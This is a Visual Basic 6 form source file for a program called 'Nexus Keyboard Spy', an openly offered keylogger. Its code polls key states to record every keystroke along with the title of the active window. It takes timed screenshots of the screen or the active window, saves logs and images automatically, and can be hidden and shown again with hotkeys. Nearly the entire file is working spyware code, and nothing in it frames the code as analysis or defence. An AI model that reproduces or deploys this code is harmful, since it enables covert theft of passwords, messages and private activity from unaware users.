VERSION 5.00
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "mscomctl.ocx"
Begin VB.Form frm_main 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Nexus Keyboard Spy"
   ClientHeight    =   6345
   ClientLeft      =   45
   ClientTop       =   435
   ClientWidth     =   10725
   BeginProperty Font 
      Name            =   "Tahoma"
      Size            =   8.25
      Charset         =   0
      Weight          =   400
      Underline       =   0   'False
      Italic          =   0   'False
      Strikethrough   =   0   'False
   EndProperty
   Icon            =   "frm_main.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   6345
   ScaleWidth      =   10725
   StartUpPosition =   3  'Windows Default
   Begin VB.CommandButton cmdAbout 
      Caption         =   "About NexusSpy"
      Height          =   375
      Left            =   7020
      TabIndex        =   12
      Top             =   5040
      Width           =   1695
   End
   Begin VB.CommandButton cmdQuit 
      Caption         =   "Quit NexusSpy"
      Height          =   375
      Left            =   8880
      TabIndex        =   11
      Top             =   5040
      Width           =   1695
   End
   Begin VB.Frame Frame3 
      Caption         =   "  SnapShot Preview"
      Height          =   3795
      Left            =   6960
      TabIndex        =   10
      Top             =   120
      Width           =   3615
      Begin VB.Image imgPreview 
         Height          =   3375
         Left            =   120
         Stretch         =   -1  'True
         Top             =   300
         Width           =   3375
      End
   End
   Begin VB.PictureBox picSnapShot 
      Height          =   615
      Left            =   9000
      ScaleHeight     =   555
      ScaleWidth      =   615
      TabIndex        =   6
      Top             =   4140
      Visible         =   0   'False
      Width           =   675
   End
   Begin VB.Frame Frame2 
      Caption         =   "  KeyLogger Preview  "
      Height          =   4095
      Left            =   120
      TabIndex        =   8
      Top             =   2100
      Width           =   6735
      Begin VB.TextBox txtLog 
         Height          =   3675
         Left            =   120
         Locked          =   -1  'True
         MultiLine       =   -1  'True
         ScrollBars      =   2  'Vertical
         TabIndex        =   9
         Top             =   300
         Width           =   6495
      End
   End
   Begin MSComctlLib.ImageList i16x16 
      Left            =   9780
      Top             =   3780
      _ExtentX        =   1005
      _ExtentY        =   1005
      BackColor       =   -2147483643
      ImageWidth      =   16
      ImageHeight     =   16
      MaskColor       =   12632256
      _Version        =   393216
      BeginProperty Images {2C247F25-8591-11D1-B16A-00C0F0283628} 
         NumListImages   =   1
         BeginProperty ListImage1 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frm_main.frx":7D42
            Key             =   ""
         EndProperty
      EndProperty
   End
   Begin VB.Timer Timer3 
      Interval        =   1
      Left            =   7980
      Top             =   4260
   End
   Begin VB.TextBox txtInterval 
      Height          =   285
      Left            =   9180
      TabIndex        =   3
      Text            =   "2"
      Top             =   4020
      Width           =   375
   End
   Begin VB.Timer Timer2 
      Enabled         =   0   'False
      Interval        =   3000
      Left            =   7500
      Top             =   4260
   End
   Begin VB.Timer Timer1 
      Enabled         =   0   'False
      Interval        =   1
      Left            =   7020
      Top             =   4260
   End
   Begin VB.CommandButton cmdStart 
      Caption         =   "Start Logging"
      Height          =   375
      Left            =   7020
      TabIndex        =   0
      Top             =   4560
      Width           =   3555
   End
   Begin VB.Frame Frame1 
      Caption         =   "  Options  "
      Height          =   1875
      Left            =   120
      TabIndex        =   1
      Top             =   120
      Width           =   6735
      Begin MSComctlLib.ListView lvwOptions 
         Height          =   1455
         Left            =   180
         TabIndex        =   7
         Top             =   240
         Width           =   6435
         _ExtentX        =   11351
         _ExtentY        =   2566
         LabelEdit       =   1
         LabelWrap       =   -1  'True
         HideSelection   =   -1  'True
         _Version        =   393217
         SmallIcons      =   "i16x16"
         ForeColor       =   -2147483640
         BackColor       =   -2147483643
         BorderStyle     =   1
         Appearance      =   1
         NumItems        =   0
      End
   End
   Begin VB.Label Label1 
      AutoSize        =   -1  'True
      Caption         =   "Press Shit + F10 To Show"
      ForeColor       =   &H00FF0000&
      Height          =   195
      Index           =   1
      Left            =   7020
      TabIndex        =   5
      Top             =   6000
      Width           =   1845
   End
   Begin VB.Label Label1 
      AutoSize        =   -1  'True
      Caption         =   "Press Shit + F9 To Hide"
      ForeColor       =   &H00FF0000&
      Height          =   195
      Index           =   0
      Left            =   7020
      TabIndex        =   4
      Top             =   5760
      Width           =   1680
   End
   Begin VB.Label Label2 
      AutoSize        =   -1  'True
      Caption         =   "SnapShot interval (second) :"
      Height          =   195
      Left            =   7020
      TabIndex        =   2
      Top             =   4020
      Width           =   2055
   End
End
Attribute VB_Name = "frm_main"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit

'// local variables declaration
Private lForeHandle As Long
Private bBackspace As Boolean
Private bCaptureScreen As Boolean
Private bAutoSaveSnapShot As Boolean
Private bAutoSaveLog As Boolean
Private bPrintDateTime As Boolean
Private Sub TakeScreenShot(ByVal bFormOnly As Boolean)
    '// if we want only active window's screen
    If bFormOnly Then
        picSnapShot.Picture = CaptureActiveWindow
    Else    '// if we want the whole screen
        picSnapShot.Picture = CaptureScreen
    End If
    '// update preview image data
    imgPreview.Picture = picSnapShot.Picture
End Sub

Private Sub cmdAbout_Click()
    '// show about form
    frm_about.Show vbModal, Me
End Sub

Private Sub cmdQuit_Click()
    Unload Me   '// unload main form
End Sub

Private Sub cmdStart_Click()
    '// check start button's caption
    Select Case cmdStart.Caption
        Case "Start Logging"    '// if its start mode
            cmdStart.Caption = "Stop Logging"   '// update button caption
            '// update listview and quit button controls
            lvwOptions.Enabled = False
            cmdQuit.Enabled = False
            '// update timer controls
            Timer1.Enabled = True
            Timer2.Enabled = True
        Case "Stop Logging" '// if its stop mode
            cmdStart.Caption = "Start Logging"  '// update button's caption
            '// update listview and quit button controls
            lvwOptions.Enabled = True
            cmdQuit.Enabled = True
            '// update timer controls
            Timer1.Enabled = False
            Timer2.Enabled = False
            '// if auto save log is selected
            If bAutoSaveLog = True Then
                Dim X As Integer    '// free file handle
                X = FreeFile    '// create a new free file
                '// open log file for input access
                Open App.Path & "\" & "log_" & _
                    Format(Now, "mm-dd-yy") & "_" & _
                    Format(Now, "hh-mm-ss") & ".txt" For Output As #X
                    '// print log text contents to file
                    Print #X, txtLog.Text
                Close #X    '// close log file
            End If
    End Select
End Sub

Private Sub Form_Initialize()
    InitCommonControls
End Sub

Private Sub Form_Load()
    bBackspace = True   '// enable backspace option
    '// initialize listview props
    With lvwOptions
        .View = lvwReport
        .GridLines = False
        .FullRowSelect = True
        .Checkboxes = True
        .FlatScrollBar = True
        .ColumnHeaders.Clear
        .ListItems.Clear
        '// add column headers
        .ColumnHeaders.Add , , "Property", .Width - 100
        .HideColumnHeaders = True   '// hide listview column headers
        '// add options listitems
        .ListItems.Add , "AutoSaveLog", "Auto save logs", , 1
        .ListItems.Add , "AutoSaveSnapShot", "Auto save snapshots", , 1
        .ListItems.Add , "EnableBackspace", "Enable Backspace", , 1
        .ListItems.Add , "CaptureScreen", "Capture Whole Screen", , 1
        .ListItems.Add , "PrintDateTime", "Print Date-Time", , 1
        '// check all listitems
        .ListItems(1).Checked = True
        .ListItems(2).Checked = True
        .ListItems(3).Checked = True
        .ListItems(4).Checked = True
        .ListItems(5).Checked = True
        '// update some local variables
        bAutoSaveLog = True '// auto save log option
        bAutoSaveSnapShot = True    '// auto save snapshot option
        bBackspace = True   '// enable backspace option
        bCaptureScreen = True   '// capture whole screen option
        bPrintDateTime = True   '// print date-time option
    End With
End Sub

Private Sub lvwOptions_ItemCheck(ByVal Item As MSComctlLib.ListItem)
    '// check selected item key string, then
    '// update the local variables with selected item's checked value
    Select Case Item.Key
        Case "AutoSaveLog"  '// auto save log item
            bAutoSaveLog = Item.Checked
        Case "AutoSaveSnapShot" '// auto save snapshot item
            bAutoSaveSnapShot = Item.Checked
        Case "EnableBackspace"  '// enable backspace item
            bBackspace = Item.Checked
        Case "CaptureScreen"    '// capture whole screen item
            bCaptureScreen = Item.Checked
        Case "PrintDateTime"    '// print date-time item
            bPrintDateTime = Item.Checked
    End Select
End Sub

Private Sub Timer1_Timer()
    Dim X1, X2 As Integer   '// async key data variables
    Dim i, t As Integer '// counter variables
    Dim lWin As Long    '// foreground window handle
    Dim strTitle As String * 1000
    
    '// Get foreground window handle
    lWin = GetForegroundWindow
    
    '// If current window handle = foreground window handle
    If (lWin = lForeHandle) Then
        '// GoTo KeyLogger label
        GoTo KeyLogger
    Else
        strTitle = ""   '// reset title string
        '// Get foreground window handle
        lForeHandle = GetForegroundWindow
        '// Get foreground window text
        GetWindowText lForeHandle, strTitle, 1000
        
        '// if asc(strTitle) is between 1 and 95
        If Asc(strTitle) >= 1 And Asc(strTitle) <= 95 Then
            '// if print date-time option is enabled
            If bPrintDateTime = True Then
                txtLog.Text = txtLog.Text & vbCrLf & "[" & Date
                txtLog.Text = txtLog.Text & " # " & Time & "]"
            End If
            '// print foreground window's title
            txtLog.Text = txtLog.Text & vbCrLf & "[" & strTitle
            txtLog.Text = txtLog.Text & "]" & vbCrLf
        End If
    End If
    '// Exit Timer1_Timer procedure
    Exit Sub

'// KeyLogger label
KeyLogger:
    '// Get standard characters, then print them
    For i = 65 To 90
        X1 = GetAsyncKeyState(i)
        X2 = GetAsyncKeyState(16)
        
        If X1 = -32767 Then
            If X2 = -32768 Then
                txtLog.Text = txtLog.Text & Chr(i)
            Else
                txtLog.Text = txtLog.Text & Chr(i + 32)
            End If
        End If
    Next i
    
    For i = 8 To 222
        If i = 65 Then
            i = 91
        End If
        
        X1 = GetAsyncKeyState(i)
        X2 = GetAsyncKeyState(16)
        
        If X1 = -32767 Then
            Select Case i
                '// Get special characters and numbers, then print them
                '// ")!@#$%^&*(0123456789"
                Case 48
                    txtLog.Text = txtLog.Text & IIf(X2 = -32768, ")", "0")
                Case 49
                    txtLog.Text = txtLog.Text & IIf(X2 = -32768, "!", "1")
                Case 50
                    txtLog.Text = txtLog.Text & IIf(X2 = -32768, "@", "2")
                Case 51
                    txtLog.Text = txtLog.Text & IIf(X2 = -32768, "#", "3")
                Case 52
                    txtLog.Text = txtLog.Text & IIf(X2 = -32768, "$", "4")
                Case 53
                    txtLog.Text = txtLog.Text & IIf(X2 = -32768, "%", "5")
                Case 54
                    txtLog.Text = txtLog.Text & IIf(X2 = -32768, "^", "6")
                Case 55
                    txtLog.Text = txtLog.Text & IIf(X2 = -32768, "&", "7")
                Case 56
                    txtLog.Text = txtLog.Text & IIf(X2 = -32768, "*", "8")
                Case 57
                    txtLog.Text = txtLog.Text & IIf(X2 = -32768, "(", "9")
                '// Get functional keys, then print them
                '// "F1,F2,F3,F4,F5,F6,F7,F8,F9,F10,F11,F12"
                Case 112
                    txtLog.Text = txtLog.Text & " F1 "
                Case 113
                    txtLog.Text = txtLog.Text & " F2 "
                Case 114
                    txtLog.Text = txtLog.Text & " F3 "
                Case 115
                    txtLog.Text = txtLog.Text & " F4 "
                Case 116
                    txtLog.Text = txtLog.Text & " F5 "
                Case 117
                    txtLog.Text = txtLog.Text & " F6 "
                Case 118
                    txtLog.Text = txtLog.Text & " F7 "
                Case 119
                    txtLog.Text = txtLog.Text & " F8 "
                Case 120
                    txtLog.Text = txtLog.Text & " F9 "
                Case 121
                    txtLog.Text = txtLog.Text & " F10 "
                Case 122
                    txtLog.Text = txtLog.Text & " F11 "
                Case 123
                    txtLog.Text = txtLog.Text & " F12 "
                
                '// Get secondary special characters, then print them
                '// "|\<,_->.?/+=:;'{[}]~`"
                Case 186
                    txtLog.Text = txtLog.Text & IIf(X2 = -32768, ":", ";")
                Case 187
                    txtLog.Text = txtLog.Text & IIf(X2 = -32768, "+", "=")
                Case 188
                    txtLog.Text = txtLog.Text & IIf(X2 = -32768, "<", ",")
                Case 189
                    txtLog.Text = txtLog.Text & IIf(X2 = -32768, "_", "-")
                Case 190
                    txtLog.Text = txtLog.Text & IIf(X2 = -32768, ">", ".")
                Case 191
                    txtLog.Text = txtLog.Text & IIf(X2 = -32768, "?", "/")
                Case 192
                    txtLog.Text = txtLog.Text & IIf(X2 = -32768, "~", "`")
                Case 219
                    txtLog.Text = txtLog.Text & IIf(X2 = -32768, "{", "[")
                Case 220
                    txtLog.Text = txtLog.Text & IIf(X2 = -32768, "|", "\")
                Case 221
                    txtLog.Text = txtLog.Text & IIf(X2 = -32768, "}", "]")
                Case 222
                    txtLog.Text = txtLog.Text & IIf(X2 = -32768, Chr(34), "'")
                '// Get control keys, then print them
                '// "BackSpace,Tab,Enter,Ctrl,Alt,CapsLock,Esc
                '// "Space,PageUp,PageDown,End,Home,Left,Right
                '// "Up,Down,Select,PrintScreen,Insert,Del,Help,Windows"
                Case 8
                    If bBackspace = True Then
                        If Len(txtLog.Text) > 0 Then
                            txtLog.Text = Mid(txtLog.Text, 1, Len(txtLog.Text) - 1)
                        End If
                    Else
                        txtLog.Text = txtLog.Text & " [Backspace] "
                    End If
                Case 9
                    txtLog.Text = txtLog.Text & " [Tab] "
                Case 13
                    txtLog.Text = txtLog.Text & vbCrLf
                Case 17
                    txtLog.Text = txtLog.Text & " [Ctrl] "
                Case 18
                    txtLog.Text = txtLog.Text & " [Alt] "
                Case 19
                    txtLog.Text = txtLog.Text & " [Pause] "
                Case 20
                    txtLog.Text = txtLog.Text & " [CapsLock] "
                Case 27
                    txtLog.Text = txtLog.Text & " [Esc] "
                Case 32
                    txtLog.Text = txtLog.Text & " "
                Case 33
                    txtLog.Text = txtLog.Text & " [PageUp] "
                Case 34
                    txtLog.Text = txtLog.Text & " [PageDown] "
                Case 35
                    txtLog.Text = txtLog.Text & " [End] "
                Case 36
                    txtLog.Text = txtLog.Text & " [Home] "
                Case 37
                    txtLog.Text = txtLog.Text & " [Left] "
                Case 38
                    txtLog.Text = txtLog.Text & " [Up] "
                Case 39
                    txtLog.Text = txtLog.Text & " [Right] "
                Case 40
                    txtLog.Text = txtLog.Text & " [Down] "
                Case 41
                    txtLog.Text = txtLog.Text & " [Select] "
                Case 44
                    txtLog.Text = txtLog.Text & " [PrintScreen] "
                Case 45
                    txtLog.Text = txtLog.Text & " [Insert] "
                Case 46
                    txtLog.Text = txtLog.Text & " [Del] "
                Case 47
                    txtLog.Text = txtLog.Text & " [Help] "
                Case 91, 92
                    txtLog.Text = txtLog.Text & " [Windows] "
            End Select
        End If
    Next i
End Sub

Private Sub Timer2_Timer()
    '// take a snapshot first
    Call TakeScreenShot(bCaptureScreen)
    '// if auto save snapshot is enabled
    If bAutoSaveSnapShot = True Then
        '// save taken snapshot to app path, SnapShots folder
        Call SavePicture(picSnapShot.Picture, App.Path & "\SnapShots\" & _
            "snapshot_" & Format(Date, "dd-mm-yy") & "_" & _
            Format(Time, "hh-mm-ss") & ".jpg")
    End If
End Sub

Private Sub Timer3_Timer()
    Dim X1, X2, X3 As Long  '// async key states
    
    X1 = GetAsyncKeyState(120)
    X2 = GetAsyncKeyState(121)
    X3 = GetAsyncKeyState(16)
    
    '// if Shift + F9 is pressed
    If X1 = -32767 And X3 = -32768 Then
        Me.Hide '// hide main form
    '// if Shift + F10 is pressed
    ElseIf X2 = -32767 And X3 = -32768 Then
        Me.Show '// show main form
    End If
End Sub

Private Sub txtInterval_Change()
    '// if interval textbox data is numeric
    If IsNumeric(txtInterval.Text) Then
        '// if interval value is between 1 and 300
        If Val(txtInterval.Text) >= 1 And Val(txtInterval.Text) <= 300 Then
            '// set the timer's interval to new value (in seconds)
            Timer2.Interval = Val(txtInterval) * 1000
        End If
    End If
End Sub

Private Sub txtInterval_GotFocus()
    '// highlight interval textbox contents
    With txtInterval
        .SelStart = 0
        .SelLength = Len(.Text)
        .SetFocus
    End With
End Sub
